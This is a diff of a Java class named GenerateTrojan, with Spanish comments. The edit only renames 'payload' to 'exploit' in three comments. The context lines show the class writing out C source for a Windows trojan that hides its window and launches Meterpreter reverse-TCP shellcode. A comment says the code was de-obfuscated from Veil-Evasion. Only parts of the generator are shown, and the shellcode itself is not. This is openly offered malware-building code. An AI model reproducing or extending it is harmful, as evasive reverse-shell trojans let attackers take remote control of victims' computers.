@@ -6,11 +6,11 @@ import java.io.IOException;
 import java.io.PrintWriter;
 
 public class GenerateTrojan {
-    public static void generate(File trojan, String IP, String PORT){     // FUNCIÓN PARA GENERAR EL PAYLOAD
+    public static void generate(File trojan, String IP, String PORT){     // FUNCIÓN PARA GENERAR EL EXPLOIT
         try{
         	FileWriter FWwriter = new FileWriter(trojan);
             PrintWriter writer = new PrintWriter(FWwriter);	// Abrimos el archivo recibido por argumentos para escribir en él
-            // ESCRIBIMOS EL PAYLOAD
+            // ESCRIBIMOS EL EXPLOIT
             // CORTESÍA DE VEIL-EVASION ( https://goo.gl/BF0evF )
             // ME TIRÉ UN PUTO DÍA DE-OFUSCANDO EL CÓDIGO DE SU PAYLOAD "c/meterpreter/reverse_tcp"
             writer.println("#define _WIN32_WINNT 0x0500");  // Establecemos _WIN32_WINNT a 0X0500 para poder ocultar la ventana
@@ -81,7 +81,7 @@ public class GenerateTrojan {
             writer.println("	}");
             writer.println("	void (*LaunchShellcode)() = (void(*)())shellcode;");  // Preparamos el método para lanzar la shellcode
             writer.println("	LaunchShellcode();"); // Y por último... ¡Lanzamos la shellcode!
-            writer.println("	return 0;");  // Cuando finalize la shellcode (probablemente por un cierre en el cliente) cerramos el payload
+            writer.println("	return 0;");  // Cuando finalize la shellcode (probablemente por un cierre en el cliente) cerramos el exploit
             writer.println("}");
             writer.close(); // Cerramos el archivo
             FWwriter.close();
